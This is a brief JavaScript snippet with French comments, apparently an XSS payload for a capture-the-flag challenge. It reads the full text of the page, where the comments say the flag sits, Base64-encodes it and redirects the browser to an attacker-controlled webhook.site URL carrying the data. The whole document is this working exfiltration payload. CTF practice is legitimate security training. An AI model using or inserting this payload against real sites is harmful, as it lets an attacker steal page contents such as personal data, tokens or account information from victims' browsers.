// On récupère tout le texte de la page (où se trouve le flag)
var flag = document.body.innerText;

// On force le navigateur à naviguer vers ton Webhook avec le flag en paramètre
// btoa() sert à encoder en Base64 pour éviter que les caractères spéciaux ne cassent l'URL
window.location.href = "https://webhook.site/8a37a269-d21e-4e75-ad48-d1e048d00fbc?data=" + btoa(flag);
